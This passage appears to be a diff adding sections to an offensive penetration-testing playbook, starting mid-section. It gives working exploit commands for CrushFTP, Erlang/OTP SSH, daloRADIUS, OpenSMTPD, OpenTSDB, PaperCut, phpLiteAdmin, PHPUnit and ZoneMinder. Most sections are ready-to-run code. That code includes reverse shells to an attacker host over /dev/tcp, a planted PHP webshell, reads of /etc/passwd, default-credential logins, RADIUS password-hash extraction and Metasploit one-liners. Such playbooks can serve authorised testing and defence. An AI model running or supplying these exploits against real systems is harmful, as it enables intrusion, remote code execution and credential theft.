+curl -s -v "http://<TARGET>:8080/" \
+  -H "Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/;SignedHeaders=;Signature=" 2>&1 | grep -i cookie
+# Extract the session cookie from the response (CrushAuth=<VALUE>)
+
+# With the admin session cookie, create a new admin user
+curl -s -b "CrushAuth=<SESSION>" "http://<TARGET>:8080/WebInterface/function/?command=setUserItem&data_action=new&username=pwnadmin&password=Pwn123!&max_logins=0&role=admin"
+
+# Login as the new admin
+curl -s -c cookies.txt "http://<TARGET>:8080/WebInterface/function/?command=login&username=pwnadmin&password=Pwn123!"
+
+# After admin access — CrushFTP admin can execute commands via:
+# Server → Admin Prefs → Plugins → or via scheduled tasks with 'execute' action
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure curl — the entire bypass is a single HTTP request with a crafted header
+curl -s "http://<TARGET>:8080/" \
+  -H "Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/;SignedHeaders=;Signature=" \
+  -D - | grep -i 'set-cookie\|crushauth'
+```
+
+### 14z.5 Erlang/OTP SSH Pre-Auth RCE — CVE-2025-32433
+
+Erlang/OTP SSH daemon (any application using the `ssh` Erlang library) allows pre-authentication channel requests. Sending `SSH_MSG_CHANNEL_REQUEST` with type `exec` before completing authentication causes command execution on vulnerable versions (OTP < 27.3.3 / 26.2.5.11 / 25.3.2.20).
+
+```bash
+# Identify Erlang SSH (banner)
+nmap -sV -p 22,2222,4369 <TARGET>
+# Look for: SSH-2.0-Erlang/<VERSION>
+nc -nv <TARGET> 22
+# 220 SSH-2.0-Erlang/5.1.2  ← vulnerable banner
+
+# Exploitation — send channel request before auth completes
+# Python PoC using paramiko transport layer manipulation:
+python3 -c "
+import socket, struct
+
+HOST, PORT = '<TARGET>', 22
+CMD = b'id'
+
+s = socket.socket()
+s.connect((HOST, PORT))
+banner = s.recv(256)
+print(f'[+] Banner: {banner.strip().decode()}')
+
+# Send our banner
+s.send(b'SSH-2.0-Exploit\r\n')
+
+# After key exchange, before authentication, send SSH_MSG_CHANNEL_OPEN + SSH_MSG_CHANNEL_REQUEST
+# This requires implementing SSH transport — use pre-built PoC from engagement toolkit
+# https://github.com/ProDefense/CVE-2025-32433
+print('[*] Use dedicated PoC tool for full exploit chain')
+s.close()
+"
+
+# Using the ProDefense PoC (pre-compiled in toolkit):
+python3 CVE-2025-32433.py <TARGET> <PORT> "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Banner identification only — the exploit requires SSH protocol manipulation
+# that cannot be achieved with standard ssh client or curl
+nc -nv <TARGET> 22 </dev/null 2>/dev/null | grep -i erlang && echo "[!] Erlang SSH - check CVE-2025-32433"
+```
+
+### 14z.6 daloRADIUS — Default Credentials + Hash Extraction
+
+daloRADIUS is a PHP web management application for FreeRADIUS. Default credentials provide operator-panel access where RADIUS user password hashes can be extracted.
+
+```bash
+# Identify daloRADIUS
+curl -s http://<TARGET>/daloradius/ | grep -iE 'daloradius|radius'
+curl -s http://<TARGET>/daloradius/app/operators/login.php
+# Common paths: /daloradius, /radius, /daloradius/app/operators/
+
+# Default credentials
+# administrator:radius
+curl -s -c cookies.txt -X POST "http://<TARGET>/daloradius/app/operators/login.php" \
+  -d "operator_user=administrator&operator_pass=radius&location=default"
+
+# Verify login
+curl -s -b cookies.txt "http://<TARGET>/daloradius/app/operators/home.php" | grep -i dashboard
+
+# Extract user credentials — navigate to Management → Users → List Users
+curl -s -b cookies.txt "http://<TARGET>/daloradius/app/operators/mng-list-all.php" | \
+  grep -oE 'username[^<]*|value[^<]*password[^<]*'
+
+# Direct DB query if MySQL creds are known (from daloradius.conf.php)
+cat /var/www/html/daloradius/app/common/includes/daloradius.conf.php 2>/dev/null | grep -E 'CONFIG_DB'
+mysql -u <DB_USER> -p'<DB_PASS>' radius -e "SELECT username, value FROM radcheck WHERE attribute='Cleartext-Password' OR attribute='NT-Password';"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure curl — login with default creds and scrape user list
+curl -s -c cookies.txt -X POST "http://<TARGET>/daloradius/app/operators/login.php" \
+  -d "operator_user=administrator&operator_pass=radius&location=default"
+curl -s -b cookies.txt "http://<TARGET>/daloradius/app/operators/mng-list-all.php"
+```
+
+### 14z.7 OpenSMTPD Pre-Auth RCE — CVE-2020-7247
+
+OpenSMTPD < 6.6.2 on OpenBSD/Linux. The `MAIL FROM` address validation allows shell metacharacters when the local part starts with a hyphen or contains specific sequences, enabling command injection during mail delivery.
+
+```bash
+# Identify OpenSMTPD
+nmap -sV -p 25,465,587 <TARGET>
+nc -nv <TARGET> 25
+# 220 <hostname> ESMTP OpenSMTPD
+
+# Exploitation — command injection via MAIL FROM
+# The payload must fit within SMTP envelope constraints
+nc <TARGET> 25 << 'EOF'
+EHLO attacker
+MAIL FROM:<;bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1';>
+RCPT TO:<root>
+DATA
+Subject: pwn
+.
+QUIT
+EOF
+
+# Alternative payload format (semicolon-separated)
+nc <TARGET> 25 << 'EOF'
+EHLO x
+MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d e f;do read r;done;sh;exit 0;>
+RCPT TO:<root@localhost>
+DATA
+#0
+#1
+#2
+#3
+#4
+#5
+#6
+#7
+#8
+#9
+#a
+#b
+#c
+#d
+#e
+bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'
+.
+QUIT
+EOF
+```
+
+```bash
+# Metasploit
+msfconsole -q -x "use exploit/unix/smtp/opensmtpd_mail_from_rce; \
+set RHOSTS <TARGET>; set LHOST <ATTACKER_IP>; set LPORT <ATTACKER_PORT>; run"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure netcat — no tools beyond nc needed
+# The SMTP protocol exchange IS the exploit delivery mechanism
+printf 'EHLO x\r\nMAIL FROM:<;id>/tmp/pwned;>\r\nRCPT TO:<root>\r\nDATA\r\ntest\r\n.\r\nQUIT\r\n' | nc <TARGET> 25
+```
+
+### 14z.8 OpenTSDB Command Injection — CVE-2020-35476
+
+OpenTSDB < 2.4.1. The `/q` query endpoint passes the `yrange` parameter unsanitized into a gnuplot command, allowing OS command injection via backticks or `$()`.
+
+```bash
+# Identify OpenTSDB (default port 4242)
+curl -s http://<TARGET>:4242/version | grep -i opentsdb
+curl -s http://<TARGET>:4242/api/version
+
+# Command injection via yrange parameter
+curl -s "http://<TARGET>:4242/q?start=2000/10/26-00:00:00&end=2000/10/27-00:00:00&m=sum:sys.cpu.user&png&yrange=%5B0:100%5D&ylabel=cpu+percent+used&wxh=1500x200&style=linespoint&smooth=csplines&yrange=%5B33:system(%27id%27)%5D"
+
+# Simpler PoC — inject into yrange
+curl -s "http://<TARGET>:4242/q?start=2016/04/13&end=2016/04/14&m=sum:sys.cpu.nice&png&wxh=1&yrange=[0:$(id)]"
+
+# Reverse shell
+curl -s "http://<TARGET>:4242/q?start=2016/04/13&end=2016/04/14&m=sum:sys.cpu.nice&png&wxh=1&yrange=[0:\$(bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT>%200>%261')]"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure curl — the injection is in the URL query parameter
+curl "http://<TARGET>:4242/q?start=2000/10/26&m=sum:sys.cpu.user&png&yrange=[0:\$(cat%20/etc/passwd)]"
+```
+
+### 14z.9 PaperCut NG/MF — CVE-2023-27350 (Unauth RCE)
+
+PaperCut NG/MF < 22.0.9 / 21.2.11 / 20.1.7 / 19.2.8. The `SetupCompleted` authentication bypass allows unauthenticated access to the admin interface, where the built-in print scripting engine (Groovy/JavaScript) provides RCE.
+
+```bash
+# Identify PaperCut (default port 9191 HTTP, 9192 HTTPS)
+curl -sk https://<TARGET>:9192/app | grep -iE 'papercut|version'
+nmap -sV -p 9191,9192 <TARGET>
+
+# Auth bypass — SetupCompleted header manipulation
+curl -sk "https://<TARGET>:9192/app?service=page/SetupCompleted" -I
+
+# Exploit — after bypass, access print scripting (Admin → Scripting)
+# Metasploit module:
+msfconsole -q -x "use exploit/multi/http/papercut_mf_ng_auth_bypass; \
+set RHOSTS <TARGET>; set RPORT 9192; set SSL true; \
+set LHOST <ATTACKER_IP>; set LPORT <ATTACKER_PORT>; run"
+
+# Manual — after gaining admin access, navigate to:
+# Options → Advanced → Scripting → Print Scripts
+# Enable scripting, then add a script with:
+# Groovy:
+Runtime.getRuntime().exec("bash -c {echo,<BASE64>}|{base64,-d}|{bash,-i}".split(" "))
+# JavaScript:
+var r = java.lang.Runtime.getRuntime(); r.exec("cmd.exe /c powershell -e <BASE64>");
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# The auth bypass is curl-only; the RCE requires interacting with the admin UI
+# scripting panel (browser or Burp to submit the scripting form)
+curl -sk "https://<TARGET>:9192/app?service=page/SetupCompleted"
+```
+
+### 14z.10 phpLiteAdmin — SQLite DB as PHP Webshell (EDB-24044)
+
+phpLiteAdmin with default password (`admin`) allows creating a SQLite database with a `.php` extension in the webroot. Insert PHP code as table data, then include/access the `.db.php` file for code execution.
+
+```bash
+# Identify phpLiteAdmin
+curl -s http://<TARGET>/phpliteadmin.php | grep -i phpliteadmin
+# Common paths: /phpliteadmin.php, /phpliteadmin/, /sqlite/
+
+# Default credential
+# password: admin
+
+# Login
+curl -s -c cookies.txt -X POST "http://<TARGET>/phpliteadmin.php" \
+  -d "password=admin&remember=yes&login=Log+In"
+
+# Step 1: Create new database with .php extension
+curl -s -b cookies.txt "http://<TARGET>/phpliteadmin.php?action=database_create" \
+  -d "new_dbname=/var/www/html/shell.php"
+
+# Step 2: Create table in the new DB
+curl -s -b cookies.txt "http://<TARGET>/phpliteadmin.php?action=table_create" \
+  -d "tablename=pwn&tablefields=1&field%5B0%5D%5Bname%5D=code&field%5B0%5D%5Btype%5D=TEXT&field%5B0%5D%5Bdefaultvalue%5D=<?php system(\$_GET['c']); ?>"
+
+# Step 3: Access the shell
+curl "http://<TARGET>/shell.php?c=id"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure curl — the entire chain is HTTP POST requests to phpLiteAdmin
+# No tools beyond curl and the default password needed
+curl -s -b cookies.txt "http://<TARGET>/phpliteadmin.php?action=row_insert" \
+  -d "table=pwn&field%5B0%5D=<?php system(\$_GET['c']); ?>"
+```
+
+### 14z.11 PHPUnit Eval-Stdin RCE — CVE-2017-9841
+
+PHPUnit < 4.8.28 / 5.x < 5.6.3 exposed via `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` in composer-installed applications. Pre-auth PHP code execution via POST body.
+
+```bash
+# Discovery — common paths where PHPUnit eval-stdin.php is web-accessible
+for path in \
+  "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
+  "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
+  "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
+  "/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"; do
+  CODE=$(curl -s -o /dev/null -w '%{http_code}' -X POST "http://<TARGET>$path" -d '<?php echo "VULN"; ?>')
+  echo "$path -> $CODE"
+done
+
+# Exploitation — POST raw PHP to eval-stdin.php
+curl -s -X POST "http://<TARGET>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
+  -d '<?php system("id"); ?>'
+
+# Reverse shell
+curl -s -X POST "http://<TARGET>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
+  -d '<?php system("bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1\""); ?>'
+
+# Windows target
+curl -s -X POST "http://<TARGET>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
+  -d '<?php system("powershell -e <BASE64_PAYLOAD>"); ?>'
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure curl — the exploit is a single POST with PHP code in the body
+curl -X POST "http://<TARGET>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
+  -d '<?php echo shell_exec("cat /etc/passwd"); ?>'
+```
+
+### 14z.12 ZoneMinder — CVE-2023-26035 (Auth Command Injection)
+
+ZoneMinder < 1.36.33 / 1.37.33. The `daemonControl` API endpoint (`/zm/api/host/daemonControl.json`) passes user-supplied parameters to shell commands without sanitization, enabling authenticated command injection.
+
+```bash
+# Identify ZoneMinder (default port 80/443, path /zm/)
+curl -s http://<TARGET>/zm/ | grep -iE 'zoneminder|version'
+curl -s "http://<TARGET>/zm/api/host/getVersion.json"
+
+# Default credentials
+# admin:admin (or no auth if configured for plain HTTP)
+
+# Authenticate and get token/cookie
+curl -s -c cookies.txt "http://<TARGET>/zm/api/host/login.json" \
+  -d "user=admin&pass=admin"
+# Extract access_token from response
+
+# CVE-2023-26035 — command injection via daemonControl
+# The 'command' parameter is injected into a shell call
+curl -s -b cookies.txt "http://<TARGET>/zm/api/host/daemonControl.json?token=<ACCESS_TOKEN>&command=;id"
+
+# Reverse shell
+curl -s -b cookies.txt \
+  "http://<TARGET>/zm/api/host/daemonControl.json?token=<ACCESS_TOKEN>&command=;bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT>%200>%261'"
+
+# Alternative injection point — snapshot ID parameter
+curl -s -b cookies.txt -X POST "http://<TARGET>/zm/index.php" \
+  -d "view=snapshot&action=create&monitor_ids[0][Id]=;id"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure curl — the injection is in a URL parameter passed to the API
+curl -s "http://<TARGET>/zm/api/host/daemonControl.json?token=<ACCESS_TOKEN>&command=;cat%20/etc/passwd"
+```
 
 ---
 
